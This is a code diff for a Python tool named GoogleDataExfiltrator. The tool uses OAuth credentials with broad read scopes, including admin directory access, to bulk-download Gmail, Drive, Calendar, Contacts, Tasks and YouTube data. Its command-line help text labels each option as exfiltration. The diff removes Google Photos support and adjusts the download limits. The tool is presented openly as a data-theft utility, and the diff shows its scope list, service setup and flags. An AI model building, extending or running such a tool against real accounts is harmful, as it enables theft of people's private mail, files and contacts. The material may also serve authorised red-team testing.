@@ -26,7 +26,6 @@ SCOPES = [
     'https://www.googleapis.com/auth/contacts.readonly',
     'https://www.googleapis.com/auth/userinfo.profile',
     'https://www.googleapis.com/auth/userinfo.email',
-    'https://www.googleapis.com/auth/photoslibrary.readonly',
     'https://www.googleapis.com/auth/tasks.readonly',
     'https://www.googleapis.com/auth/youtube.readonly',
     'https://www.googleapis.com/auth/admin.directory.user.readonly',
@@ -96,7 +95,6 @@ class GoogleDataExfiltrator:
             self.services['drive'] = build('drive', 'v3', credentials=self.creds)
             self.services['calendar'] = build('calendar', 'v3', credentials=self.creds)
             self.services['people'] = build('people', 'v1', credentials=self.creds)
-            self.services['photoslibrary'] = build('photoslibrary', 'v1', credentials=self.creds, static_discovery=False)
             self.services['tasks'] = build('tasks', 'v1', credentials=self.creds)
             self.services['youtube'] = build('youtube', 'v3', credentials=self.creds)
             
@@ -1482,8 +1480,6 @@ Examples:
                        help='Exfiltrate Google Calendar data')
     parser.add_argument('--contacts', action='store_true',
                        help='Exfiltrate Google Contacts data')
-    parser.add_argument('--photos', action='store_true',
-                       help='Exfiltrate Google Photos data')
     parser.add_argument('--tasks', action='store_true',
                        help='Exfiltrate Google Tasks data')
     parser.add_argument('--keep', action='store_true',
@@ -1502,8 +1498,6 @@ Examples:
                        help='Max emails to download (default: 100, 0 = unlimited)')
     parser.add_argument('--limit-files', type=int, default=50,
                        help='Max Drive files to download (default: 50, 0 = unlimited)')
-    parser.add_argument('--limit-photos', type=int, default=50,
-                       help='Max photos to download (default: 50, 0 = unlimited)')
     parser.add_argument('--limit-events', type=int, default=1000,
                        help='Max calendar events per calendar (default: 1000, 0 = unlimited)')
     parser.add_argument('--limit-contacts', type=int, default=0,
@@ -1537,15 +1531,14 @@ Examples:
     if args.no_limits:
         print("[!] WARNING: Running with no limits - this may take hours and use significant bandwidth!")
         limits = {key: None for key in ['gmail_messages', 'drive_files', 'calendar_events', 
-                                          'contacts', 'photos', 'keep_notes', 'youtube_videos']}
+                                          'contacts', 'tasks', 'youtube_videos']}
     else:
         limits = {
             'gmail_messages': args.limit_emails if args.limit_emails > 0 else None,
             'drive_files': args.limit_files if args.limit_files > 0 else None,
             'calendar_events': args.limit_events if args.limit_events > 0 else None,
             'contacts': args.limit_contacts if args.limit_contacts > 0 else None,
-            'photos': args.limit_photos if args.limit_photos > 0 else None,
-            'keep_notes': args.limit_notes if args.limit_notes > 0 else None,
+            'tasks': None,
             'youtube_videos': args.limit_videos if args.limit_videos > 0 else None,
         }
     
